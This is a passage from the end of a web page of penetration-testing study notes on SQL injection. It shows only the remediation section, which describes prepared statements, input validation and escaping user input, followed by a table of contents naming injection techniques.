<p><img decoding="async" loading="lazy" alt="Out-of-Band SQLi" src="/assets/images/SQL_Injection_3-f16a5a692ae73270b377a30b985b0c9f.png" width="371" height="357" class="img_ev3q"></p>
<h1>Remediation</h1>
<ul>
<li>Prepared Statements (With Parameterized Queries)
In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn&#x27;t change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.</li>
<li>Input Validation
Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. </li>
<li>Escaping User Input
Allowing user input containing characters such as<code>&#x27; &quot; $ \</code>can cause SQL Queries to break or, even worse, as we&#x27;ve learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash () to these characters, which then causes them to be parsed just as a regular string and not a special character.</li>
</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Intro to SSRF"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Intro to SSRF</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Subdomain Enumeration"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Subdomain Enumeration</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#select" class="table-of-contents__link toc-highlight">SELECT</a></li><li><a href="#union" class="table-of-contents__link toc-highlight">UNION</a></li><li><a href="#insert" class="table-of-contents__link toc-highlight">INSERT</a></li><li><a href="#update" class="table-of-contents__link toc-highlight">UPDATE</a></li><li><a href="#delete" class="table-of-contents__link toc-highlight">DELETE</a></li><li><a href="#error-based-sql-injection" class="table-of-contents__link toc-highlight">Error-Based SQL Injection</a></li><li><a href="#union-based-sql-injection" class="table-of-contents__link toc-highlight">Union-Based SQL Injection</a></li><li><a href="#authentication-bypass" class="table-of-contents__link toc-highlight">Authentication Bypass</a></li><li><a href="#boolean-based" class="table-of-contents__link toc-highlight">Boolean Based</a></li><li><a href="#time-based" class="table-of-contents__link toc-highlight">Time Based</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 Gabriel@pochacco.top</div></div></div></footer></div>
</body>
</html>